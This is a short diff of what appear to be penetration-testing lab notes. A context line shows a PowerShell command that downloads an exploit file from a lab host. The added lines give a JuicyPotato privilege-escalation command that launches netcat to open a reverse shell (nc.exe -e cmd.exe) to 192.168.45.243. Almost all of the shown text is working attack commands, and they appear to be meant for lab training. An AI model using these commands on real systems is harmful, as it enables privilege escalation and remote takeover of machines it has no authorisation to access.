@@ -23,3 +23,8 @@ $wc = New-Object System.Net.WebClient
 $wc.DownloadFile("http://192.168.45.238/exploit.txt","C:\Users\student\Downloads\exploit.txt") 
 ```
 
+JuicyPotato Attack
+
+```
+juicypotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\Users\Public\Documents\nc.exe -e cmd.exe 192.168.45.243 1234" -t *
+```
